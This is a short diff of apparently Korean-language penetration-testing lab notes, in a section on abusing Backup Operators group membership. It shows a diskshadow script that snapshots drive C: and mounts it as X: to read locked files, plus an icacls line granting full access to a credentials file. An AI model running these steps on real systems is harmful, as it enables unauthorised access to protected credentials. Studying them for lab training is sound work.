@@ -532,16 +532,20 @@ icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
 ---
 <details>
  <summary><strong>Backup Operators group</strong></summary>
-
-```bash
+ 
+```
 # vss.dsh
 set context persistent nowriters
 add volume c: alias viper
 create
 expose %viper% x:
 ```
+```bash
+# 줄바꿈 변경
+unix2dos vss.dsh
+```
 ```powershell
-# C드라이브 스냅샷 생성 및 X드라이브로 마운트 - 잠금파일 접근 가능해짐.
+# C드라이브 스냅샷 생성 및 X드라이브로 마운트 - 잠금파일 접근 가능
 diskshadow /s vss.dsh
 
 # 데이터 복사
